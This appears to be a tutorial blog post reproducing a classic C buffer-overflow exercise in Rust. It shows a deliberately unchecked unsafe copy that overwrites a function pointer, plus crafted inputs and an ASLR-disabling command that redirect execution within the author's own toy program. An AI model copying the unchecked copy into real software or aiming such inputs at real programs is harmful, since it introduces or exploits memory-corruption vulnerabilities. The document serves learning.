---
title: Playing with buffer overflow in Rust
---

## 1. Foreword

For a long time I wanted to play with a buffer overflow exploit. The idea is pretty simple: the "attacker" prepares specially crafted input, so that too many bytes are written into the buffer and, as a result, adjacent memory locations are overwritten, potentially changing the behavior of the program. Initially my idea was to implement this using C, but after I started learning Rust I was also curious how would it differ. In general, it's just a small exercise in using raw function pointers in Rust.

Of course, performing such attack in the wild is much harder than locally in our own program, where we can change the code, how it is executed, turn off protections and it's easy to check memory locations used. But still, it's fun ;)

## 2. An example in C

To avoid overcomplicating things I looked for a tutorial how to do it in C first. My choice was to use a struct with a buffer and a pointer to a function, which is executed after reading the first command line argument into the buffer. One of the easiest ways to make use of buffer overflow. This is the tutorial, which describes such example: [Into the art of Binary Exploitation 0x00000](https://infosecwriteups.com/into-the-art-of-binary-exploitation-0x000001-stack-based-overflow-50fe48d58f10).

And here is the code in C, taken from this tutorial:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void abracadabra() {
 printf("Abracadabra! Function called!\n");
 exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*point)();
  } hackvist;

  hackvist.point = NULL;
  strcpy(hackvist.buffer, argv[1]);

  printf("abracadabra function address: %p\n",abracadabra);
  printf("hackvist.point after strcpy: %p\n", hackvist.point);
  if (hackvist.point) {
    fflush(stdout);
    hackvist.point();
  } else {
    printf("Try Again\n");
  }

  exit(0);
}
```

## 3. The code in Rust

My goal was to translate this code above into Rust. This is the function we'll try to call:
```Rust
fn abracadabra() {
    println!("Abracadabra! Function called!");
}
```

And this is the struct with a buffer, which we'll try to overflow:
```Rust
#[repr(C)]
struct Hackvist {
    buffer: [u8; 16],
    point: *const fn(),
}
```

We'll also need some unsafe function, to copy bytes without checking the size of the destination buffer. This can be done with `std::ptr::copy()`:
```Rust
unsafe {
    std::ptr::copy(
        input_bytes.as_ptr(),
        hackvist.buffer.as_mut_ptr(),
        input_bytes.len(),
    )
}
```

At the end, to make our life easier, we'll add printing of `abracadabra()` function address, as well as, the content of `hackvist.point`, so we can find out what should we provide as an input to call `abracadabra()`:
```Rust
println!("abracadabra function address: x{:0x}", abracadabra as usize);
println!(
    "hackvist.point after strcpy: x{:0x}",
    hackvist.point as usize 
);
println!(
    "hackvist.point after strcpy (in chars): {:?}",
    (hackvist.point as usize as u64)
        .to_le_bytes()
        .into_iter()
        .map(|b| char::from(b))
        .collect::<String>()
);
```

Taken all of this together, this is the source code for this buffer overflow exercise:
```Rust
use std::env;
use std::ffi::OsString;
use std::os::unix::ffi::OsStrExt;

fn abracadabra() {
    println!("Abracadabra! Function called!");
}

#[repr(C)]
struct Hackvist {
    buffer: [u8; 16],
    point: *const fn(),
}

fn main() {
    let mut args: Vec<OsString> = env::args_os().into_iter().collect();
    let first_arg: OsString = args.remove(1);
    let input_bytes: &[u8] = first_arg.as_bytes();
    let mut hackvist = Hackvist {
        buffer: [0; 16],
        point: 0 as *const fn() -> (),
    };
    
    unsafe {
        std::ptr::copy(
            input_bytes.as_ptr(),
            hackvist.buffer.as_mut_ptr(),
            input_bytes.len(),
        )
    }
    
    println!("abracadabra function address: x{:0x}", abracadabra as usize);
    println!(
        "hackvist.point after strcpy: x{:0x}",
        hackvist.point as usize 
    );
    println!(
        "hackvist.point after strcpy (in chars): {:?}",
        (hackvist.point as usize as u64)
            .to_le_bytes()
            .into_iter()
            .map(|b| char::from(b))
            .collect::<String>()
    );

    if hackvist.point as usize == 0 {
        println!("Try again");
    } else {
        let code: fn() = unsafe { std::mem::transmute(hackvist.point) };
        code();
    }
}
```

## 4. Running it!

Now, let's try to build it:
```
$ rustc --edition 2021 buffer-overflow.rs
```
And run (the values can differ on your computer):
```
$ ./buffer-overflow "AAAABBBB"
abracadabra function address: x5595670e21d0
hackvist.point after strcpy: x0
hackvist.point after strcpy (in chars): "\u{0}\u{0}\u{0}\u{0}\u{0}\u{0}\u{0}\u{0}"
Try again
```
This time the input string was too short `AAAABBBB` has only 8 bytes, so it wasn't enough to overflow our 16 byte buffer and write into `hackvist.point` function pointer. Let's try with longer input:

```
$ ./buffer-overflow "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
abracadabra function address: x55a4246391d0
hackvist.point after strcpy: x4646464645454545
hackvist.point after strcpy (in chars): "EEEEFFFF"
Segmentation fault (core dumped)
```
As we can see, we managed to overflow the buffer and write into the function pointer. It wasn't correctly set, so there was a segmentation fault.

Right now we'll want to change letters `EEEEFFFF` in the input string into `abracadabra()` function address. Let's try:
```
$ ./buffer-overflow $(python -c 'print "AAAABBBBCCCCDDDD\xd0\x91\x63\x24\xa4\x55"')
abracadabra function address: x55f9ece391d0
hackvist.point after strcpy: x55a4246391d0
hackvist.point after strcpy (in chars): "Ð\u{91}c$¤U\u{0}\u{0}"
Segmentation fault (core dumped)
```

It didn't work, even though the `hackvist.point` was "correctly" overwritten with `x55a4246391d0`, which is exactly the `abracadabra()` function address from our previous run: `x55a4246391d0`.

The reason for this is that on my machine, [address space layout randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization) is used to make buffer overflow attacks harder. This can be turned off by running the binary with:
```
$ setarch x86_64 -R ./buffer-overflow \
> $(python -c 'print "AAAABBBBCCCCDDDD\xd0\x91\x63\x24\xa4\x55"')
abracadabra function address: x55555555e1d0
hackvist.point after strcpy: x55a4246391d0
hackvist.point after strcpy (in chars): "Ð\u{91}c$¤U\u{0}\u{0}"
Segmentation fault (core dumped)
```

This time the address has changed once again, but from now on, the `abracadabra()` function address shouldn't change, so we can use `x55555555e1d0` address in our input:

```
$ setarch x86_64 -R ./buffer-overflow \
> $(python -c 'print "AAAABBBBCCCCDDDD\xd0\xe1\x55\x55\x55\x55"')
abracadabra function address: x55555555e1d0
hackvist.point after strcpy: x55555555e1d0
hackvist.point after strcpy (in chars): "ÐáUUUU\u{0}\u{0}"
Abracadabra! Function called!
```

Success! Buffer overflow has overwritten the `hackvist.point` pointer with a valid function address and we have changed the program behaviour with our sneaky input :)
